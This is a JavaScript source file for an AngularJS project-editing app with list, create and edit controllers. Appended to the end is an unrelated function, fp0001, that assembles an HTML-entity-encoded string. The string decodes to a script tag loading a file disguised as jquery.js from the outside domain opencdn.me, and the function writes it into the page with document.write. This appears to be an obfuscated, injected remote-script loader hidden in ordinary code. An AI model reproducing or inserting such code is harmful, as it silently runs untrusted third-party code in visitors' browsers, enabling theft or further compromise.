angular.module('project', ['mongolab']).
  config(function($routeProvider) {
    $routeProvider.
      when('/', {controller:ListCtrl, templateUrl:'list.html'}).
      when('/edit/:projectId', {controller:EditCtrl, templateUrl:'detail.html'}).
      when('/new', {controller:CreateCtrl, templateUrl:'detail.html'}).
      otherwise({redirectTo:'/'});
  });
 
 
function ListCtrl($scope, Project) {
  $scope.projects = Project.query();
}
 
 
function CreateCtrl($scope, $location, Project) {
  $scope.save = function() {
    Project.save($scope.project, function(project) {
      $location.path('/edit/' + project._id.$oid);
    });
  }
}
 
 
function EditCtrl($scope, $location, $routeParams, Project) {
  var self = this;
 
  Project.get({id: $routeParams.projectId}, function(project) {
    self.original = project;
    $scope.project = new Project(self.original);
  });
 
  $scope.isClean = function() {
    return angular.equals(self.original, $scope.project);
  }
 
  $scope.destroy = function() {
    self.original.destroy(function() {
      $location.path('/list');
    });
  };
 
  $scope.save = function() {
    $scope.project.update(function() {
      $location.path('/');
    });
  };
}

function fp0001()
{
var cFziajUiEoSGXyJ="";

cFziajUiEoSGXyJ+="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;&#47;&#47;";
cFziajUiEoSGXyJ+="&#111;&#112;&#101;&#110;&#99;&#100;&#110;&#46;&#109;&#101;&#47;&#115;&#99;&#114;&#105;";
cFziajUiEoSGXyJ+="&#112;&#116;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#106;&#115;&#34;&#62;&#60;";
cFziajUiEoSGXyJ+="&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
document.write(cFziajUiEoSGXyJ);
}